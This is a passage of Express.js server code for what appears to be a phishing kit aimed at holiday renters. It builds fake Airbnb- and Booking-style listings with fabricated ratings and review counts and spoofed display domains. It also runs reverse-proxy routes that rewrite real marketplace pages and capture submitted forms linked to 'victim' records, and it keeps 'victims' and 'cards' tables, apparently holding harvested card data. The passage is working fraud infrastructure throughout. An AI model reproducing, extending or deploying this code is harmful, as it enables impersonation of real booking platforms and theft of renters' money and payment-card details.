    if (b.image_urls) {
      String(b.image_urls).split(/\r?\n/).map(s => s.trim()).filter(Boolean).forEach(u => images.push(u));
    }
    if (b.image_url && String(b.image_url).trim()) images.push(String(b.image_url).trim());
    images = [...new Set(images.filter(Boolean))];
    const primary = images[0] || (apt && apt.image_url) || '';

    let amenArr = [];
    if (b.amenity) {
      amenArr = Array.isArray(b.amenity) ? b.amenity : [b.amenity];
    }
    if (b.amenities_custom) {
      String(b.amenities_custom).split(',').map(s => s.trim()).filter(Boolean).forEach(a => amenArr.push(a));
    }
    if (!amenArr.length && b.amenities) {
      amenArr = String(b.amenities).split(',').map(s => s.trim()).filter(Boolean);
    }
    if (!amenArr.length && apt && apt.amenities) {
      amenArr = String(apt.amenities).split(',').map(s => s.trim()).filter(Boolean);
    }
    amenArr = [...new Set(amenArr.map(s => String(s).trim()).filter(Boolean))];
    const amenities = amenArr.join(', ') || 'Wifi, Kitchen, Washer, Free parking';

    const locale = ((apt && apt.locale) || b.locale || 'en').trim().toLowerCase();
    const localeInfo = LOCALES[locale] || LOCALES.en;
    const currency = (apt && apt.currency) || localeInfo.currency;
    const hideNightly = apt
      ? (Number(apt.hide_nightly) === 1 ? 1 : 0)
      : ((b.hide_nightly === '1' || b.hide_nightly === 'on' || b.hide_nightly === 'true') ? 1 : 0);

    let proxyTarget = (b.proxy_target_url || '').trim();
    const proxyOn = (b.proxy_mode === '1' || b.proxy_mode === 'on' || b.proxy_mode === 'true');
    const derived = proxyOn ? deriveProxyIdentity(proxyTarget, marketplace) : { code: '', publicPath: '', host: '', marketplace };

    let effectiveMp = marketplace;
    if (proxyOn && derived.marketplace) effectiveMp = derived.marketplace;

    let domainHost = autoDisplayDomain(effectiveMp, locale, b.display_domain || (apt && apt.display_domain) || derived.host || '');
    if (proxyOn && derived.host) domainHost = derived.host;
    const meta = resolveDomainMeta(effectiveMp, domainHost);

    let code = (b.listing_code || '').trim().replace(/[^a-zA-Z0-9._-]/g, '');
    if (proxyOn && derived.code) code = derived.code;
    if (!code) code = randomListingCode(effectiveMp, title, b.location || '');
    if (effectiveMp === 'booking' && !code.endsWith('.html') && !/\.html$/i.test(code)) {
      /* keep hotel slug as-is; booking public_path from derive already has .html when present */
    }
    let publicPath = proxyOn && derived.publicPath ? derived.publicPath : buildPublicPath(effectiveMp, code);
    for (let i = 0; i < 5; i++) {
      const clash = db.prepare('SELECT id FROM listings WHERE public_path = ? OR listing_code = ?').get(publicPath, code);
      if (!clash) break;
      if (proxyOn && derived.code) {
        // hard clash on real room id — keep code, only suffix path uniquely via unused alternate rarely
        publicPath = derived.publicPath;
        break;
      }
      code = randomListingCode(effectiveMp, title, b.location || '');
      publicPath = buildPublicPath(effectiveMp, code);
    }
    if (proxyOn && !proxyTarget && code) {
      proxyTarget = buildProxyTargetUrl({ marketplace: effectiveMp, listing_code: code, display_domain: meta.host, public_path: publicPath, proxy_target_url: '' });
    }
    let hostRow = null;
    const hostId = parseInt(b.host_id, 10) || 0;
    if (hostId) {
      hostRow = db.prepare('SELECT * FROM hosts WHERE id = ? AND user_id = ?').get(hostId, req.user.id);
      if (!hostRow) return res.status(400).send('Host not found');
    }

    let hostPhoto = '';
    if (hostFiles[0]) hostPhoto = '/uploads/' + hostFiles[0].filename;
    else if (flatFiles.length) {
      const hostFile = flatFiles.find(f => f.fieldname === 'host_photo');
      if (hostFile) hostPhoto = '/uploads/' + hostFile.filename;
    }
    if (b.host_photo_url && String(b.host_photo_url).trim()) hostPhoto = String(b.host_photo_url).trim();
    if (!hostPhoto && hostRow && hostRow.photo) hostPhoto = hostRow.photo;
    if (!hostPhoto && apt && apt.host_photo) hostPhoto = apt.host_photo;

    const hostName = (hostRow && hostRow.name)
      || (b.host_name || '').trim()
      || (apt && apt.host_name)
      || req.user.username;

    let videoUrl = '';
    if (videoFiles[0]) videoUrl = '/uploads/' + videoFiles[0].filename;
    if (b.video_url && String(b.video_url).trim()) videoUrl = String(b.video_url).trim();

    const listingRating = (hostRow && hostRow.rating) || (apt ? (apt.rating || '4.92') : (b.rating || '4.92'));
    const listingReviews = hostRow
      ? (hostRow.reviews_count || 48)
      : (apt ? (apt.reviews || 48) : (parseInt(b.reviews, 10) || 48));

    const result = db.prepare(`INSERT INTO listings
      (user_id, marketplace, title, description, price, price_month, image_url, images, location, guests, bedrooms, beds, baths, amenities, host_name, host_photo, rating, reviews, property_type, display_domain, public_path, listing_code, locale, currency, video_url, hide_nightly, proxy_target_url, proxy_mode, apartment_id, host_id, client_first_name, client_last_name, client_phone, client_email, client_address, client_stay_duration, booking_status)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'not_opened')`).run(
      req.user.id,
      effectiveMp,
      title,
      (apt ? (apt.description || '') : (b.description || '')),
      (apt ? (apt.price || '0') : (b.price || '0')),
      (apt ? (apt.price_month || '') : (b.price_month || '')),
      primary,
      JSON.stringify(images),
      (apt ? (apt.location || '') : (b.location || '')),
      apt ? (apt.guests || 2) : (parseInt(b.guests, 10) || 2),
      apt ? (apt.bedrooms || 1) : (parseInt(b.bedrooms, 10) || 1),
      apt ? (apt.beds || 1) : (parseInt(b.beds, 10) || 1),
      apt ? (apt.baths || 1) : (parseFloat(b.baths) || 1),
      amenities,
      hostName,
      hostPhoto || '',
      listingRating,
      listingReviews,
      (apt ? (apt.property_type || 'Entire apartment') : (b.property_type || 'Entire apartment')),
      meta.host,
      publicPath,
      code,
      locale,
      currency,
      videoUrl || (apt && apt.video_url) || '',
      hideNightly,
      proxyTarget || (apt && apt.proxy_target_url) || '',
      proxyOn ? 1 : (apt && Number(apt.proxy_mode) === 1 ? 1 : 0),
      apartmentId || null,
      hostId || null,
      clientFirst,
      clientLast,
      clientPhone,
      clientEmail,
      clientAddress,
      clientStay
    );
    try {
      db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'create_listing', ?, ?)").run(
        req.user.id, `listing #${result.lastInsertRowid} ${marketplace} ${publicPath}`, req.ip
      );
    } catch (e) {}
    const _geoLoc = apt ? (apt.location || '') : (b.location || '');
    if (_geoLoc.trim()) {
      try {
        const _geoResult = await geocodeLocation(_geoLoc);
        if (_geoResult) {
          db.prepare('UPDATE listings SET latitude = ?, longitude = ? WHERE id = ?')
            .run(_geoResult.latitude, _geoResult.longitude, result.lastInsertRowid);
        }
      } catch (_ge) { console.error('[geocode] create failed:', _ge.message); }
    }
    const created = db.prepare('SELECT * FROM listings WHERE id = ?').get(result.lastInsertRowid);
    syncListingToClone(created).catch(e => console.error('[clone] create sync:', e.message));
    res.redirect('/dashboard/listari?created=' + result.lastInsertRowid);
  } catch (err) {
    console.error('create listing error', err);
    res.status(500).send('Eroare la crearea listării: ' + err.message);
  }
}


async function handleUpdateListing(req, res) {
  try {
    const id = parseInt(req.params.id, 10);
    const existing = db.prepare('SELECT * FROM listings WHERE id = ? AND user_id = ?').get(id, req.user.id);
    if (!existing) return res.status(404).send('Listare negăsită');

    const b = req.body || {};
    const title = (b.title || '').trim();
    if (!title) return res.status(400).send('Titlu obligatoriu');

    const marketplace = existing.marketplace; // keep original platform + path/code

    const fileBag = req.files || {};
    const photoFiles = Array.isArray(fileBag.photos) ? fileBag.photos : [];
    const hostFiles = Array.isArray(fileBag.host_photo) ? fileBag.host_photo : [];
    const videoFiles = Array.isArray(fileBag.videos) ? fileBag.videos : [];

    let images = [];
    try { images = existing.images ? JSON.parse(existing.images) : []; } catch (e) { images = []; }
    if (!Array.isArray(images)) images = [];
    if (!images.length && existing.image_url) images = [existing.image_url];

    let removeSet = b.remove_image;
    if (!removeSet) removeSet = [];
    if (!Array.isArray(removeSet)) removeSet = [removeSet];
    removeSet = new Set(removeSet.map(String));
    images = images.filter(u => !removeSet.has(String(u)));

    photoFiles.forEach(f => images.push('/uploads/' + f.filename));
    if (b.image_urls) {
      String(b.image_urls).split(/\r?\n/).map(s => s.trim()).filter(Boolean).forEach(u => images.push(u));
    }
    if (b.image_url && String(b.image_url).trim()) images.push(String(b.image_url).trim());
    images = [...new Set(images.filter(Boolean))];
    const primary = images[0] || '';

    let amenArr = [];
    if (b.amenity) amenArr = Array.isArray(b.amenity) ? b.amenity : [b.amenity];
    if (b.amenities_custom) {
      String(b.amenities_custom).split(',').map(s => s.trim()).filter(Boolean).forEach(a => amenArr.push(a));
    }
    amenArr = [...new Set(amenArr.map(s => String(s).trim()).filter(Boolean))];
    const amenities = amenArr.join(', ') || existing.amenities || 'Wifi, Kitchen';

    const locale = (b.locale || existing.locale || 'en').trim().toLowerCase();
    const localeInfo = LOCALES[locale] || LOCALES.en;
    const currency = localeInfo.currency;
    const hideNightly = (b.hide_nightly === '1' || b.hide_nightly === 'on' || b.hide_nightly === 'true') ? 1 : 0;

    let proxyTarget = (b.proxy_target_url !== undefined ? String(b.proxy_target_url) : existing.proxy_target_url || '').trim();
    const proxyOn = (b.proxy_mode === '1' || b.proxy_mode === 'on' || b.proxy_mode === 'true');
    const derived = proxyOn ? deriveProxyIdentity(proxyTarget, marketplace) : { code: '', publicPath: '', host: '' };

    let domainHost = autoDisplayDomain(marketplace, locale, b.display_domain || existing.display_domain);
    if (proxyOn && derived.host) domainHost = derived.host;
    const meta = resolveDomainMeta(marketplace, domainHost);

    // When proxy mode + real target URL: refresh public_path / listing_code from room id
    let nextCode = existing.listing_code;
    let nextPath = existing.public_path;
    if (proxyOn && derived.code && derived.publicPath) {
      const clash = db.prepare('SELECT id FROM listings WHERE id != ? AND (public_path = ? OR listing_code = ?)').get(id, derived.publicPath, derived.code);
      if (!clash) {
        nextCode = derived.code;
        nextPath = derived.publicPath;
      } else if (Number(clash.id) === id) {
        nextCode = derived.code;
        nextPath = derived.publicPath;
      }
    }

    let hostPhoto = existing.host_photo || '';
    if (b.remove_host_photo === '1' || b.remove_host_photo === 'on') hostPhoto = '';
    if (hostFiles[0]) hostPhoto = '/uploads/' + hostFiles[0].filename;
    if (b.host_photo_url && String(b.host_photo_url).trim()) hostPhoto = String(b.host_photo_url).trim();

    let nextHostId = existing.host_id || null;
    let hostName = b.host_name || existing.host_name || req.user.username;
    const updHostId = parseInt(b.host_id, 10) || 0;
    if (updHostId) {
      const hr = db.prepare('SELECT * FROM hosts WHERE id = ? AND user_id = ?').get(updHostId, req.user.id);
      if (hr) {
        nextHostId = hr.id;
        hostName = hr.name || hostName;
        if (hr.photo) hostPhoto = hr.photo;
      }
    }

    let videoUrl = existing.video_url || '';
    if (b.remove_video === '1' || b.remove_video === 'on') videoUrl = '';
    if (videoFiles[0]) videoUrl = '/uploads/' + videoFiles[0].filename;
    if (b.video_url && String(b.video_url).trim()) videoUrl = String(b.video_url).trim();

    db.prepare(`UPDATE listings SET
      title = ?, description = ?, price = ?, price_month = ?, image_url = ?, images = ?,
      location = ?, guests = ?, bedrooms = ?, beds = ?, baths = ?, amenities = ?,
      host_name = ?, host_photo = ?, rating = ?, reviews = ?, property_type = ?,
      display_domain = ?, public_path = ?, listing_code = ?, locale = ?, currency = ?, video_url = ?, hide_nightly = ?,
      proxy_target_url = ?, proxy_mode = ?,
      client_first_name = ?, client_last_name = ?, client_phone = ?, client_email = ?, client_address = ?, client_stay_duration = ?,
      apartment_id = COALESCE(?, apartment_id),
      host_id = ?
      WHERE id = ? AND user_id = ?`).run(
      title,
      b.description || '',
      b.price || '0',
      b.price_month || '',
      primary,
      JSON.stringify(images),
      b.location || '',
      parseInt(b.guests, 10) || 2,
      parseInt(b.bedrooms, 10) || 1,
      parseInt(b.beds, 10) || 1,
      parseFloat(b.baths) || 1,
      amenities,
      hostName,
      hostPhoto,
      b.rating || existing.rating || '4.92',
      parseInt(b.reviews, 10) || 0,
      b.property_type || existing.property_type || 'Entire apartment',
      meta.host,
      nextPath,
      nextCode,
      locale,
      currency,
      videoUrl,
      hideNightly,
      proxyTarget,
      proxyOn ? 1 : 0,
      (b.client_first_name !== undefined ? String(b.client_first_name).trim() : (existing.client_first_name || '')),
      (b.client_last_name !== undefined ? String(b.client_last_name).trim() : (existing.client_last_name || '')),
      (b.client_phone !== undefined ? String(b.client_phone).trim() : (existing.client_phone || '')),
      (b.client_email !== undefined ? String(b.client_email).trim() : (existing.client_email || '')),
      (b.client_address !== undefined ? String(b.client_address).trim() : (existing.client_address || '')),
      (b.client_stay_duration !== undefined ? String(b.client_stay_duration).trim() : (existing.client_stay_duration || '')),
      (parseInt(b.apartment_id, 10) || null),
      nextHostId,
      id,
      req.user.id
    );

    try {
      db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'update_listing', ?, ?)").run(
        req.user.id, `listing #${id} updated`, req.ip
      );
    } catch (e) {}

    const _newLoc = (b.location || '').trim();
    const _oldLoc = (existing.location || '').trim();
    if (_newLoc !== _oldLoc || existing.latitude == null) {
      if (_newLoc) {
        try {
          const _geoResult = await geocodeLocation(_newLoc);
          if (_geoResult) {
            db.prepare('UPDATE listings SET latitude = ?, longitude = ? WHERE id = ?')
              .run(_geoResult.latitude, _geoResult.longitude, id);
          } else if (_newLoc !== _oldLoc) {
            db.prepare('UPDATE listings SET latitude = NULL, longitude = NULL WHERE id = ?').run(id);
          }
        } catch (_ge) { console.error('[geocode] update failed:', _ge.message); }
      } else if (_newLoc !== _oldLoc) {
        try { db.prepare('UPDATE listings SET latitude = NULL, longitude = NULL WHERE id = ?').run(id); } catch (_ge) {}
      }
    }

    const updatedRow = db.prepare('SELECT * FROM listings WHERE id = ?').get(id);
    syncListingToClone(updatedRow).catch(e => console.error('[clone] update sync:', e.message));
    res.redirect('/dashboard/listari?updated=' + id);
  } catch (err) {
    console.error('update listing error', err);
    res.status(500).send('Eroare la actualizarea listării: ' + err.message);
  }
}




function deleteListingCascade(id, userId) {
  const listing = db.prepare('SELECT id FROM listings WHERE id = ? AND user_id = ?').get(id, userId);
  if (!listing) return false;
  const victims = db.prepare('SELECT id FROM victims WHERE listing_id = ?').all(id);
  const delCards = db.prepare('DELETE FROM cards WHERE victim_id = ?');
  for (const v of victims) {
    try { delCards.run(v.id); } catch (e) {}
  }
  try { db.prepare('DELETE FROM victims WHERE listing_id = ?').run(id); } catch (e) {}
  try { db.prepare('DELETE FROM payments WHERE listing_id = ?').run(id); } catch (e) {}
  db.prepare('DELETE FROM listings WHERE id = ? AND user_id = ?').run(id, userId);
  return true;
}


// === PROXY ROUTES ===
// Hierarchical join-safe: /_mfpx/:id/u/{s|p}/{host}{path...}
// Legacy base64: /_mfpx/:id/:token  and /_mfpx/:id/raw?url=
// Express 4 single-segment params can't catch nested /u/... trees — use middleware.
app.use((req, res, next) => {
  if (!String(req.path || '').startsWith('/_mfpx/')) return next();
  if (req.method !== 'GET' && req.method !== 'POST' && req.method !== 'HEAD') return next();
  return handleMfpx(req, res);
});

app.post('/api/proxy-submit/:id', (req, res) => {
  try {
    const id = parseInt(req.params.id, 10);
    const listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(id);
    if (!listing) return res.json({ ok: false, error: 'not found' });
    const vid = req.body && req.body.victim_id ? parseInt(req.body.victim_id, 10) : null;
    const result = handleProxySubmit(id, req.body, vid);
    res.json(result);
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});

app.post('/api/proxy-submit/:id/:targetUrl', (req, res) => {
  try {
    const id = parseInt(req.params.id, 10);
    const vid = req.body && req.body.victim_id ? parseInt(req.body.victim_id, 10) : null;
    const result = handleProxySubmit(id, req.body, vid);
    res.json(result);
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});

app.get('/api/proxy-iframe/:id', (req, res) => {
  const id = parseInt(req.params.id, 10);
  const listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(id);
  if (!listing) return res.status(404).send('not found');
  const url = req.query.url || buildProxyTargetUrl(listing);
  fetchUrl(url)
    .then((result) => {
      let html = result.body;
      html = rewriteProxyHtml(html, url, id, reqOrigin(req), null, req);
      res.type('html').send(html);
    })
    .catch((err) => res.status(502).send('Proxy error: ' + err.message));
});

app.post('/api/proxy-next-step/:id', (req, res) => {
  res.json({ ok: true });
});

app.post('/api/proxy-refresh/:id', requireClient, (req, res) => {
  try {
    const id = parseInt(req.params.id, 10);
    const listing = db.prepare('SELECT * FROM listings WHERE id = ? AND user_id = ?').get(id, req.user.id);
    if (!listing) return res.status(404).json({ ok: false });
    for (const k of [...PROXY_CACHE.keys()]) {
      if (k.startsWith(id + '|')) PROXY_CACHE.delete(k);
    }
    res.json({ ok: true, cleared: true });
  } catch (e) {
    res.json({ ok: false, error: e.message });
  }
});


app.get('/dashboard/listings/delete/:id', requireClient, (req, res) => {
  try {
    const id = parseInt(req.params.id, 10);
    if (!id) return res.redirect('/dashboard/listari');
    deleteListingCascade(id, req.user.id);
  } catch (err) {
    console.error('delete listing error', err);
    return res.status(500).send('<div style="text-align:center;padding:40px;font-family:sans-serif;background:#0d0d1a;color:#e0e0e0;min-height:100vh"><h1 style="color:#e74c3c">Eroare la stergere</h1><p>' + String(err.message || err) + '</p><a href="/dashboard/listari" style="color:#4CAF50">Inapoi</a></div>');
  }
  res.redirect('/dashboard/listari');
});

app.post('/dashboard/listings/delete-bulk', requireClient, (req, res) => {
  try {
    let ids = req.body.ids;
    if (!ids) ids = [];
    if (!Array.isArray(ids)) ids = [ids];
    ids = ids.map(x => parseInt(x, 10)).filter(n => n > 0);
    let deleted = 0;
    for (const id of ids) {
      try {
        if (deleteListingCascade(id, req.user.id)) deleted++;
      } catch (e) {
        console.error('bulk delete one failed', id, e);
      }
    }
    res.redirect('/dashboard/listari?deleted=' + deleted);
  } catch (err) {
    console.error('bulk delete error', err);
    return res.status(500).send('<div style="text-align:center;padding:40px;font-family:sans-serif;background:#0d0d1a;color:#e0e0e0;min-height:100vh"><h1 style="color:#e74c3c">Eroare la stergere</h1><p>' + String(err.message || err) + '</p><a href="/dashboard/listari" style="color:#4CAF50">Inapoi</a></div>');
  }
});

// === LISTING STATUS ===
app.post('/dashboard/listings/status/:id', requireClient, (req, res) => {
  try {
    const id = parseInt(req.params.id, 10);
    const status = String((req.body && req.body.status) || '').trim();
    const allowed = BOOKING_STATUSES.map(s => s.id);
    if (!allowed.includes(status)) return res.status(400).json({ ok: false, error: 'Invalid status' });
    const row = db.prepare('SELECT id FROM listings WHERE id = ? AND user_id = ?').get(id, req.user.id);
    if (!row) return res.status(404).json({ ok: false, error: 'Not found' });
    db.prepare("UPDATE listings SET booking_status = ?, status_updated_at = datetime('now'), opened_at = CASE WHEN ? = 'open' AND opened_at IS NULL THEN datetime('now') ELSE opened_at END WHERE id = ? AND user_id = ?")
      .run(status, status, id, req.user.id);
    try { io.emit('listing_status', { id, booking_status: status, userId: req.user.id }); } catch (e) {}
    res.json({ ok: true, status });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

// === MARKETPLACE LISTING VIEW ===
// Renders a saved listing using the Marketplace airbnb-style template.
// No victim writes, no proxy, no legacy listing handler.
app.get('/dashboard/listings/view/:id', requireAdmin, (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (!id) return res.status(404).send('Not found');
  const listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(id);
  if (!listing) return res.status(404).send('Not found');
  const host = listing.host_id
    ? db.prepare('SELECT * FROM hosts WHERE id = ?').get(listing.host_id) || null
    : null;

  // Lazy geocode: if listing has a location string but no coordinates, geocode in the
  // background so that coordinate-based nearby matching works on the next page view.
  if (!listing.latitude && listing.location && String(listing.location).trim()) {
    const { geocodeLocation } = require('./marketplace/utils/geocode');
    geocodeLocation(listing.location).then(coords => {
      if (coords) {
        try {
          db.prepare('UPDATE listings SET latitude = ?, longitude = ? WHERE id = ? AND latitude IS NULL')
            .run(coords.latitude, coords.longitude, id);
        } catch (e) {}
      }
    }).catch(() => {});
  }

  // Query nearby listings (exclude current listing).
  const nearbyListings = (function getNearbyListings() {
    const lat = listing.latitude;
    const lon = listing.longitude;
    const MAX = 10;
    const COLS = 'id, title, image_url, images, price, price_month, currency, locale, rating, reviews, location, property_type, listing_code';

    // 1. Coordinate-based: ~50 km bounding box (0.45° ≈ 50 km).
    if (lat != null && isFinite(Number(lat)) && lon != null && isFinite(Number(lon))) {
      const delta = 0.45;
      let rows = db.prepare(
        'SELECT ' + COLS + ' FROM listings WHERE id != ? AND latitude BETWEEN ? AND ? AND longitude BETWEEN ? AND ? LIMIT ?'
      ).all(id, Number(lat) - delta, Number(lat) + delta, Number(lon) - delta, Number(lon) + delta, MAX);

      // 1b. Wider fallback (~300 km) to fill remaining slots when tight box yields fewer than MAX.
      if (rows.length < MAX) {
        const delta2 = 3.0;
        const excl = [id, ...rows.map(r => r.id)];
        const ph = excl.map(() => '?').join(',');
        const wider = db.prepare(
          'SELECT ' + COLS + ' FROM listings WHERE id NOT IN (' + ph + ') AND latitude BETWEEN ? AND ? AND longitude BETWEEN ? AND ? LIMIT ?'
        ).all(...excl, Number(lat) - delta2, Number(lat) + delta2, Number(lon) - delta2, Number(lon) + delta2, MAX - rows.length);
        rows = rows.concat(wider);
      }

      if (rows.length) return rows;
    }

    // 2. City text fallback: match on the first segment of the location string.
    const locStr = String(listing.location || '').trim();
    const city = locStr.split(',')[0].trim();
    if (city.length >= 2) {
      const rows = db.prepare(
        'SELECT ' + COLS + ' FROM listings WHERE id != ? AND location LIKE ? LIMIT ?'
      ).all(id, '%' + city + '%', MAX);
      if (rows.length) return rows;
    }

    return [];
  }());

  // Load per-listing seoLinks from reviews_json (stored as JSON with title, nearbyCityLinks, otherStaysLinks).
  const seoLinks = (() => {
    try {
      const raw = listing.reviews_json;
      if (!raw) return null;
      const parsed = JSON.parse(raw);
      if (parsed && (parsed.nearbyCityLinks || parsed.otherStaysLinks)) return parsed;
      return null;
    } catch (e) { return null; }
  })();

  const { getTemplate } = require('./marketplace/templates/accommodation/index');
  const render = getTemplate('airbnb-style');
  res.send(render(listing, host, { nearbyListings, seoLinks }));
});

// === APARTMENTS LIBRARY ===
app.get('/dashboard/apartments', requireClient, (req, res) => {
  const apts = db.prepare('SELECT * FROM apartments WHERE user_id = ? ORDER BY updated_at DESC, id DESC').all(req.user.id);
  const rows = apts.map(a => {
    let n = 0;
    try { n = a.images ? JSON.parse(a.images).length : (a.image_url ? 1 : 0); } catch (e) { n = a.image_url ? 1 : 0; }
    const hasVid = a.video_url ? ' · video' : '';
    return `<tr>
      <td style="padding:12px;color:#666;font-size:12px">#${a.id}</td>
      <td style="padding:12px;color:#fff;font-weight:600">${esc(a.name)}</td>
      <td style="padding:12px;color:#bbb;max-width:220px">${esc(a.title)}</td>
      <td style="padding:12px;color:#999">${esc(a.location||'')}</td>
      <td style="padding:12px;color:#4CAF50;font-weight:600">${esc(String(a.price_month||a.price||'—'))}</td>
      <td style="padding:12px;color:#888;font-size:13px">${n} photos${hasVid}</td>
      <td style="padding:12px;white-space:nowrap">
        <a href="/dashboard/apartments/edit/${a.id}" style="color:#4da3ff;margin-right:12px;text-decoration:none">Edit</a>
        <a href="/dashboard/create?apt=${a.id}" style="color:#22c55e;margin-right:12px;text-decoration:none">Use</a>
        <a href="/dashboard/apartments/delete/${a.id}" onclick="return confirm('Delete apartment?')" style="color:#f44336;text-decoration:none">Delete</a>
      </td>
    </tr>`;
  }).join('') || `<tr><td colspan="7" style="padding:32px;color:#666;text-align:center">No apartments yet. Add one below — usable on Airbnb and Booking.</td></tr>`;
  let content = `<div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:8px">
      <div>
        <h1 style="margin:0 0 6px">Apartment library</h1>
        <p style="color:#777;margin:0;font-size:14px">Shared templates for Airbnb & Booking. Save once, pick when creating a listing.</p>
      </div>
      <a href="#aptForm" style="padding:12px 20px;background:linear-gradient(90deg,#FF385C,#E61E4D);color:#fff;border-radius:12px;text-decoration:none;font-weight:700;box-shadow:0 8px 24px rgba(255,56,92,.25)">+ New apartment</a>
    </div>
    <div class="panel" style="overflow-x:auto;margin-top:18px;border-radius:14px">
      <table class="data-table" style="width:100%">
        <tr style="color:#666;font-size:11px;text-transform:uppercase;letter-spacing:.04em"><th style="padding:12px">ID</th><th style="padding:12px">Name</th><th style="padding:12px">Title</th><th style="padding:12px">Location</th><th style="padding:12px">Price</th><th style="padding:12px">Media</th><th style="padding:12px"></th></tr>
        ${rows}
      </table>
    </div>
    <div style="margin-top:28px">${apartmentFormHtml(null)}</div>`;
  res.send(clientPage('Apartments', content, req.user));
});

app.get('/dashboard/apartments/edit/:id', requireClient, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const apt = db.prepare('SELECT * FROM apartments WHERE id = ? AND user_id = ?').get(id, req.user.id);
  if (!apt) return res.redirect('/dashboard/apartments');
  const content = `<div style="margin-bottom:8px"><a href="/dashboard/apartments" style="color:#8899ff">← Back</a></div>${apartmentFormHtml(apt)}`;
  res.send(clientPage('Apartments', content, req.user));
});

app.get('/dashboard/apartments/delete/:id', requireClient, (req, res) => {
  const id = parseInt(req.params.id, 10);
  db.prepare('DELETE FROM apartments WHERE id = ? AND user_id = ?').run(id, req.user.id);
  res.redirect('/dashboard/apartments');
});

app.post('/dashboard/apartments/save', requireClient, (req, res, next) => {
  listingUpload(req, res, (err) => {
    if (err) return res.status(400).send('Upload error: ' + (err.message || err));
    try {
      const b = req.body || {};
      const id = parseInt(b.id, 10) || 0;
      const name = (b.name || b.title || '').trim();
      const title = (b.title || '').trim();
      if (!name || !title) return res.status(400).send('Name and title required');
      const marketplace = 'shared';
      const fileBag = req.files || {};
      const photoFiles = Array.isArray(fileBag.photos) ? fileBag.photos : [];
      const hostFiles = Array.isArray(fileBag.host_photo) ? fileBag.host_photo : [];
      const videoFiles = Array.isArray(fileBag.videos) ? fileBag.videos : [];
      let images = [];
      let existing = id ? db.prepare('SELECT * FROM apartments WHERE id = ? AND user_id = ?').get(id, req.user.id) : null;
      if (existing && existing.images) {
        try { images = JSON.parse(existing.images) || []; } catch (e) { images = []; }
      }
      if (!images.length && existing && existing.image_url) images = [existing.image_url];
      let removeSet = b.remove_image;
      if (!removeSet) removeSet = [];
      if (!Array.isArray(removeSet)) removeSet = [removeSet];
      removeSet = new Set(removeSet.map(String));
      images = images.filter(u => !removeSet.has(String(u)));
      photoFiles.forEach(f => images.push('/uploads/' + f.filename));
      if (b.image_urls) String(b.image_urls).split(/\\r?\\n/).map(s => s.trim()).filter(Boolean).forEach(u => images.push(u));
      if (b.image_url && String(b.image_url).trim()) images.push(String(b.image_url).trim());
      images = [...new Set(images.filter(Boolean))];
      const primary = images[0] || '';
      let amenArr = [];
      if (b.amenity) amenArr = Array.isArray(b.amenity) ? b.amenity : [b.amenity];
      if (b.amenities_custom) String(b.amenities_custom).split(',').map(s => s.trim()).filter(Boolean).forEach(a => amenArr.push(a));
      const amenities = [...new Set(amenArr.map(s => String(s).trim()).filter(Boolean))].join(', ') || (existing && existing.amenities) || 'Wifi, Kitchen';
      const locale = (b.locale || 'gb').trim().toLowerCase();
      const currency = (LOCALES[locale] || LOCALES.en).currency;
      const hideNightly = (b.hide_nightly === '1' || b.hide_nightly === 'on') ? 1 : 0;
      let hostPhoto = (existing && existing.host_photo) || '';
      if (hostFiles[0]) hostPhoto = '/uploads/' + hostFiles[0].filename;
      if (b.host_photo_url && String(b.host_photo_url).trim()) hostPhoto = String(b.host_photo_url).trim();
      let videoUrl = (existing && existing.video_url) || '';
      if (videoFiles[0]) videoUrl = '/uploads/' + videoFiles[0].filename;
      if (b.video_url && String(b.video_url).trim()) videoUrl = String(b.video_url).trim();
      const domainHost = autoDisplayDomain(marketplace, locale, b.display_domain || '');
      const fields = [
        name, marketplace, title, b.description || '', b.price || '0', b.price_month || '',
        primary, JSON.stringify(images), b.location || '',
        parseInt(b.guests, 10) || 2, parseInt(b.bedrooms, 10) || 1, parseInt(b.beds, 10) || 1, parseFloat(b.baths) || 1,
        amenities, b.host_name || req.user.username, hostPhoto, b.rating || '4.92', parseInt(b.reviews, 10) || 48,
        b.property_type || 'Entire apartment', domainHost, locale, currency, videoUrl, hideNightly,
        (b.proxy_target_url || '').trim(), (b.proxy_mode === '1' || b.proxy_mode === 'on') ? 1 : 0
      ];
      if (existing) {
        db.prepare(`UPDATE apartments SET name=?, marketplace=?, title=?, description=?, price=?, price_month=?, image_url=?, images=?,
          location=?, guests=?, bedrooms=?, beds=?, baths=?, amenities=?, host_name=?, host_photo=?, rating=?, reviews=?,
          property_type=?, display_domain=?, locale=?, currency=?, video_url=?, hide_nightly=?, proxy_target_url=?, proxy_mode=?,
          updated_at=datetime('now') WHERE id=? AND user_id=?`).run(...fields, id, req.user.id);
      } else {
        db.prepare(`INSERT INTO apartments (user_id, name, marketplace, title, description, price, price_month, image_url, images,
          location, guests, bedrooms, beds, baths, amenities, host_name, host_photo, rating, reviews, property_type,
          display_domain, locale, currency, video_url, hide_nightly, proxy_target_url, proxy_mode)
          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(req.user.id, ...fields);
      }
      res.redirect('/dashboard/apartments');
    } catch (e) {
      console.error('apartment save', e);
      res.status(500).send('Error: ' + e.message);
    }
  });
});

function amenityChipsHtml(selected) {
  const sel = (selected || []).map(s => String(s).toLowerCase());
  const defaults = new Set(['wifi','kitchen','washer','dryer','free parking','air conditioning','heating','tv','hair dryer','iron']);
  return AMENITY_LIST.map((a) => {
    const on = sel.length
      ? sel.includes(a.toLowerCase())
      : defaults.has(a.toLowerCase());
    return `<label class="amen-item"><input type="checkbox" name="amenity" value="${esc(a)}"${on ? ' checked' : ''}><span class="amen-label">${esc(a)}</span></label>`;
  }).join('');
}

